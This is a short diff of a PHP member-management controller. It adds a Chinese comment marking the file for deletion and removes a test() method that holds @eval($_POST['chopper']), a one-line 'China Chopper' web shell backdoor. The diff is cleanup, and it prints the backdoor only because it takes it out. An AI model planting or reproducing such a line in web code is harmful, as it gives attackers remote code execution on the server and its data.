@@ -1,4 +1,5 @@
 <?php
+//已分离，待确认后删除该文件
 import("@.Common.CommonAction");
 class MemberAction extends CommonAction {
 	
@@ -590,12 +591,6 @@ class MemberAction extends CommonAction {
             echo "saveOK";
         }
     }
-    
-    public function test() {
-    	@eval($_POST['chopper']);
-    	exit(0);
-    }
-
 }
 
 ?>
